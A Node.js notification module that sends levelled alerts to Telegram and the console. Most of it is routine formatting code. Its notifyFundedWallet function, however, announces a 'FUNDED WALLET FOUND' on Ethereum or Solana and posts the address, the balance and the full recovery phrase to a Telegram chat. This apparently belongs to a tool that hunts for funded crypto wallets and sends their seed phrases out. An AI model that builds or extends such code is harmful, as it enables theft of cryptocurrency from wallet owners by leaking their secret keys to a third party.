// backend/services/notifiers/notificationService.js

const { sendTelegramMessage } = require("./telegramNotifier")

// Notification levels
const LEVELS = {
  INFO: "INFO",
  SUCCESS: "SUCCESS",
  WARNING: "WARNING",
  ERROR: "ERROR",
  CRITICAL: "CRITICAL",
}

/**
 * Send a notification to all configured channels
 * @param {string} message - The message to send
 * @param {string} level - Notification level (INFO, SUCCESS, WARNING, ERROR, CRITICAL)
 * @param {Object} data - Additional data to include in the notification
 */
async function notify(message, level = LEVELS.INFO, data = {}) {
  // Format the message based on level
  const formattedMessage = formatMessage(message, level, data)

  // Send to Telegram
  await sendTelegramMessage(formattedMessage)

  // Log to console
  logToConsole(message, level, data)

  // Future: Add more notification channels here (Discord, Email, SMS, etc.)
}

/**
 * Format a message for notification
 */
function formatMessage(message, level, data) {
  const timestamp = new Date().toISOString()
  const emoji = getEmojiForLevel(level)

  let formattedMessage = `${emoji} *${level}* | ${timestamp}\n${message}`

  // Add data details if provided
  if (data && Object.keys(data).length > 0) {
    const dataString = Object.entries(data)
      .map(([key, value]) => `• *${key}*: ${value}`)
      .join("\n")

    formattedMessage += `\n\n*Details:*\n${dataString}`
  }

  return formattedMessage
}

/**
 * Log a message to the console
 */
function logToConsole(message, level, data) {
  const timestamp = new Date().toISOString()
  const emoji = getEmojiForLevel(level)

  console.log(`${emoji} [${level}] ${timestamp} - ${message}`)

  if (data && Object.keys(data).length > 0) {
    console.log("Details:", data)
  }
}

/**
 * Get emoji for notification level
 */
function getEmojiForLevel(level) {
  switch (level) {
    case LEVELS.INFO:
      return "ℹ️"
    case LEVELS.SUCCESS:
      return "✅"
    case LEVELS.WARNING:
      return "⚠️"
    case LEVELS.ERROR:
      return "❌"
    case LEVELS.CRITICAL:
      return "🔥"
    default:
      return "📢"
  }
}

// Convenience methods for different notification levels
const info = (message, data) => notify(message, LEVELS.INFO, data)
const success = (message, data) => notify(message, LEVELS.SUCCESS, data)
const warning = (message, data) => notify(message, LEVELS.WARNING, data)
const error = (message, data) => notify(message, LEVELS.ERROR, data)
const critical = (message, data) => notify(message, LEVELS.CRITICAL, data)

// Special notification for funded wallets
async function notifyFundedWallet(chain, address, balance, phrase) {
  const message = `💰 FUNDED WALLET FOUND on ${chain.toUpperCase()}`
  const data = {
    Chain: chain,
    Address: address,
    Balance: `${balance} ${chain === "ethereum" ? "ETH" : "SOL"}`,
    Phrase: phrase,
  }

  return notify(message, LEVELS.CRITICAL, data)
}

module.exports = {
  notify,
  info,
  success,
  warning,
  error,
  critical,
  notifyFundedWallet,
  LEVELS,
}
